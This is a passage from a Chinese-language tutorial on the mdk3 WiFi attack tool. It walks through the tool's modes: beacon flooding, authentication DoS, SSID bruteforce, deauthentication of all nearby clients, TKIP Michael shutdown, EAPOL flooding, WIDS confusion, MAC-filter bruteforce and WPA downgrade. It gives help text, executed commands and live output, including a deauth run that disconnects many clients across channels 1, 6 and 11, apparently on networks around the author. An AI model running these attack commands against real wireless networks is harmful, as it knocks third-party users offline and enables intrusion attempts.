+Current MAC: 69:E7:07:32:6F:F5 on Channel  6 with SSID: haha-646
+Current MAC: DF:44:23:EC:80:AF on Channel  6 with SSID: haha-706
+Current MAC: F9:CC:C2:F4:06:99 on Channel  6 with SSID: haha-767
+Current MAC: 99:D8:B9:EE:96:BD on Channel  6 with SSID: haha-827
+Current MAC: DF:80:2E:49:23:6F on Channel  6 with SSID: haha-887
+Current MAC: 29:7B:E8:14:68:F7 on Channel  6 with SSID: haha-948
+Current MAC: 67:15:30:41:B1:6F on Channel  6 with SSID: haha-1008
+Current MAC: 36:62:38:8E:A7:3E on Channel  6 with SSID: haha-1068
+Current MAC: 29:24:AD:7A:4F:48 on Channel  6 with SSID: haha-1128
+Current MAC: E2:65:84:89:72:57 on Channel  6 with SSID: haha-1189
+Current MAC: 9A:08:98:B0:40:C9 on Channel  6 with SSID: haha-1249
+Current MAC: F9:10:E0:EF:D3:0F on Channel  6 with SSID: haha-1309
+Current MAC: 38:CB:AD:EA:6E:98 on Channel  6 with SSID: haha-1369
+</code></pre><h3 id="2-2-a-authentication-dos-mode">2.2 a - Authentication DoS mode</h3>
+<p>验证请求攻击，模拟大量的客户端进行连接请求，当AP接收的请求过多就会停止对正常用户的响应</p>
+<pre><code>a   - Authentication DoS mode
+      Sends authentication frames to all APs found in range.
+      Too much clients freeze or reset some APs.
+</code></pre><p>五个参数</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help a
+a   - Authentication DoS mode
+      Sends authentication frames to all APs found in range.
+      Too much clients freeze or reset almost every AP.
+      OPTIONS:
+      -a &lt;ap_mac&gt;                    //测试指定的AP
+         Only test the specified AP
+      -m                            //使用数据库中的MAC地址
+         Use valid client MAC from OUI database
+      -c                            //不检查测试是否成功
+         Do NOT check for test being successful
+      -i &lt;ap_mac&gt;                    //智能测试，忽略-a，-i两个参数
+         Perform intelligent test on AP (-a and -c will be ignored)
+         This test connects clients to the AP and reinjects sniffed data to keep them alive
+      -s &lt;pps&gt;                        //发包速率，默认50
+         Set speed in packets per second (Default: unlimited)
+</code></pre><p>执行</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 mon0 a -i A8:57:4E:6C:9B:14 -s 100
+
+Sniffing one beacon frame to read capabilities and SSID...
+Capabilities are: 31:04
+SSID is: nishidoubi
+Clients: Created:    1   Authenticated:    0   Associated:    0   Got Kicked:    0
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:    8   Authenticated:    4   Associated:    4   Got Kicked:    0
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   16   Authenticated:    7   Associated:    7   Got Kicked:    0
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   24   Authenticated:   13   Associated:   13   Got Kicked:    0
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   32   Authenticated:   17   Associated:   15   Got Kicked:    2
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   38   Authenticated:   18   Associated:   15   Got Kicked:    2
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   45   Authenticated:   18   Associated:   15   Got Kicked:    3
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   53   Authenticated:   18   Associated:   15   Got Kicked:    3
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   59   Authenticated:   18   Associated:   15   Got Kicked:    3
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   62   Authenticated:   18   Associated:   15   Got Kicked:    3
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Clients: Created:   70   Authenticated:   18   Associated:   15   Got Kicked:    3
+Data   : Captured:    0   Sent:    0   Responses:    0   Relayed:    0
+Packets sent:   1184 - Speed:  129 packets/
+</code></pre><h3 id="2-3-p-basic-probing-and-essid-bruteforce-mode">2.3 p - Basic probing and ESSID Bruteforce mode</h3>
+<p>用于探测隐藏的AP</p>
+<pre><code>p   - Basic probing and ESSID Bruteforce mode
+      Probes AP and check for answer, useful for checking if SSID has
+      been correctly decloaked or if AP is in your adaptors sending range
+      SSID Bruteforcing is also possible with this test mode.
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help p 
+p   - Basic probing and ESSID Bruteforce mode
+      Probes AP and check for answer, useful for checking if SSID has
+      been correctly decloaked or if AP is in your adaptors sending range
+      Use -f and -t option to enable SSID Bruteforcing.
+      OPTIONS:
+      -e &lt;ssid&gt;
+         Tell mdk3 which SSID to probe for
+      -f &lt;filename&gt;
+         Read lines from file for bruteforcing hidden SSIDs
+      -t &lt;bssid&gt;
+         Set MAC adress of target AP
+      -s &lt;pps&gt;
+         Set speed (Default: unlimited, in Bruteforce mode: 300)
+      -b &lt;character set&gt;
+         Use full Bruteforce mode (recommended for short SSIDs only!)
+         Use this switch only to show its help screen.
+</code></pre><h3 id="2-4-d-deauthentication-disassociation-amok-mode">2.4 d - Deauthentication/Disassociation Amok Mode</h3>
+<p>这是一项非常强悍的功能，能强行断开周围所有的连接，人性化的地方在于有白名单和黑名单</p>
+<pre><code>d   - Deauthentication / Disassociation Amok Mode
+      Kicks everybody found from AP
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help d
+d   - Deauthentication / Disassociation Amok Mode
+      Kicks everybody found from AP
+      OPTIONS:
+      -w &lt;filename&gt;                    //白名单
+         Read file containing MACs not to care about (Whitelist mode)
+      -b &lt;filename&gt;                    //黑名单
+         Read file containing MACs to run test on (Blacklist Mode)
+      -s &lt;pps&gt;                        //攻击速率，默认无限制
+         Set speed in packets per second (Default: unlimited)
+      -c [chan,chan,chan,...]        //信道
+         Enable channel hopping. Without providing any channels, mdk3 will hop an all
+         14 b/g channels. Channel will be changed every 5 seconds.
+</code></pre><p>执行</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 mon0 d -w tools/mdk3/AP_white_mac -s 100 -c 1,6,11
+
+Periodically re-reading blacklist/whitelist every 3 seconds
+
+Disconnecting between: 01:00:5E:7F:FF:FA and: 78:A1:06:58:81:70 on channel: 1
+Disconnecting between: 01:00:5E:7F:FF:FA and: 78:A1:06:58:81:70 on channel: 1
+Disconnecting between: 01:00:5E:7F:FF:FA and: 78:A1:06:58:81:70 on channel: 6
+Disconnecting between: CC:29:F5:95:01:96 and: A8:57:4E:26:6F:EC on channel: 1
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 11
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 11
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 1
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: EC:5A:86:D6:1C:82 and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 11
+Disconnecting between: 33:33:00:00:00:16 and: FC:D7:33:EA:C8:50 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 1
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 1
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 1
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: EC:5A:86:D6:1C:82 and: FC:D7:33:EA:C8:50 on channel: 6
+Disconnecting between: BC:30:7E:18:FE:E3 and: FC:D7:33:EA:C8:50 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: FC:D7:33:EA:C8:50 on channel: 1
+</code></pre><h3 id="2-5-m-michael-shutdown-exploitation-tkip-">2.5 m - Michael shutdown exploitation (TKIP)</h3>
+<p>看解释</p>
+<pre><code>m   - Michael shutdown exploitation (TKIP)
+      Cancels all traffic continuously
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help m
+m   - Michael shutdown exploitation (TKIP)
+      Cancels all traffic continuously
+      -t &lt;bssid&gt;
+         Set Mac address of target AP
+      -w &lt;seconds&gt;
+         Seconds between bursts (Default: 10)
+      -n &lt;ppb&gt;
+         Set packets per burst (Default: 70)
+      -j
+         Use the new TKIP QoS-Exploit
+         Needs just a few packets to shut AP down!
+      -s &lt;pps&gt;
+         Set speed (Default: 400)
+</code></pre><h3 id="2-6-x-802-1x-tests">2.6 x - 802.1X tests</h3>
+<p>802.1X协议下进行测试</p>
+<pre><code>x   - 802.1X tests
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help x
+x   - 802.1X tests
+      0 - EAPOL Start packet flooding
+            -n &lt;ssid&gt;
+               Use SSID &lt;ssid&gt;
+            -t &lt;bssid&gt;
+               Set MAC address of target AP
+            -w &lt;WPA type&gt;
+               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
+            -u &lt;unicast cipher&gt;
+               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -m &lt;multicast cipher&gt;
+               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -s &lt;pps&gt;
+               Set speed (Default: 400)
+      1 - EAPOL Logoff test
+            -t &lt;bssid&gt;
+               Set MAC address of target AP
+            -c &lt;bssid&gt;
+               Set MAC address of target STA
+            -s &lt;pps&gt;
+               Set speed (Default: 400)
+</code></pre><h3 id="2-7-w-wids-wips-confusion">2.7 w - WIDS/WIPS Confusion</h3>
+<p>看解释</p>
+<pre><code>w   - WIDS/WIPS Confusion
+      Confuse/Abuse Intrusion Detection and Prevention Systems
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help w
+w   - WIDS/WIPS/WDS Confusion
+      Confuses a WDS with multi-authenticated clients which messes up routing tables
+      -e &lt;SSID&gt;
+         SSID of target WDS network
+      -c [chan,chan,chan...]
+         Use channel hopping
+      -z
+         activate Zero_Chaos&#39; WIDS exploit
+         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
+</code></pre><h3 id="2-8-f-mac-filter-bruteforce-mode">2.8 f - MAC filter bruteforce mode</h3>
+<p>看解释</p>
+<pre><code>f   - MAC filter bruteforce mode
+      This test uses a list of known client MAC Adresses and tries to
+      authenticate them to the given AP while dynamically changing
+      its response timeout for best performance. It currently works only
+      on APs who deny an open authentication request properly
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help f
+f   - MAC filter bruteforce mode
+      This test uses a list of known client MAC Adresses and tries to
+      authenticate them to the given AP while dynamically changing
+      its response timeout for best performance. It currently works only
+      on APs who deny an open authentication request properly
+      -t &lt;bssid&gt;
+         Target BSSID
+      -m &lt;mac&gt;
+         Set the MAC adress range to use (3 bytes, i.e. 00:12:34)
+         Without -m, the internal database will be used
+      -f &lt;mac&gt;
+         Set the MAC adress to begin bruteforcing with
+         (Note: You can&#39;t use -f and -m at the same time)
+</code></pre><h3 id="2-9-g-wpa-downgrade-test">2.9 g - WPA Downgrade test</h3>
+<p>这个模式有点社会工程系的感觉，通过测试看管理员会不会把WiFi设置成WEP或者取消加密</p>
+<pre><code>g   - WPA Downgrade test
+      deauthenticates Stations and APs sending WPA encrypted packets.
+      With this test you can check if the sysadmin will try setting his
+      network to WEP or disable encryption.
+</code></pre><p>help</p>
+<pre><code>[root@tot0c /home/wnagzihxain]# mdk3 --help g
+g   - WPA Downgrade test
+      deauthenticates Stations and APs sending WPA encrypted packets.
+      With this test you can check if the sysadmin will try setting his
+      network to WEP or disable encryption. mdk3 will let WEP and unencrypted
+      clients work, so if the sysadmin simply thinks &quot;WPA is broken&quot; he
+      sure isn&#39;t the right one for this job.
+      (this can/should be combined with social engineering)
+      -t &lt;bssid&gt;
+         Target network
+</code></pre><h2 id="0x03-">0x03 小结</h2>
+<p>从测试来看mdk3是非常好用的一个WiFi攻击工具，特别是d模式，一开始测试的时候没有加白名单，自己的直接断掉了，本文仅仅是做一个工具使用的分享，如果有地方描述的不准确还请发邮件联系，谢谢:-))</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
